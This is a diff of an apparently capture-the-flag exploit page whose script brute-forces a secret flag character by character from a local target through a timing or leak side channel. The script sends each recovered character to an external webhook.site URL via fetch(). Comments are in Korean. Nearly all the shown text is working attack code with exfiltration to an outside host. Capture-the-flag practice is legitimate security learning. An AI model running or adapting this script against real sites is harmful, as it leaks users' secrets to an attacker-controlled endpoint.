@@ -8,8 +8,8 @@
     <script>
         const TARGET = 'http://localhost:3031'; 
         const REPORT_URL = 'https://webhook.site/c52095bc-72e6-4717-80a3-37bddf872811'; 
-        let flag = "RS{"; 
-        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_}";
+        let flag = "RS{a"; 
+        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
 
         function report(data) {
             fetch(`${REPORT_URL}?log=${encodeURIComponent(data)}`);
@@ -27,15 +27,19 @@
         async function bruteForce() {
             report("start: " + flag);
             
-            for (let i = 0; i < 30; i++) {
+           while (!flag.endsWith("}")) {
+                let found = false;
                 for (let c of chars) {
-                    const time = await check(flag + c);
-                    if (time > 1) { 
+                    if (await leak(flag + c)) {
                         flag += c;
                         report("찾은 글자: " + flag);
-                        if (c === '}') return;
+                        found = true;
                         break;
                     }
+                }
+                if (!found) {
+                    report("다시.");
+                    break;
                 }
             }
         }
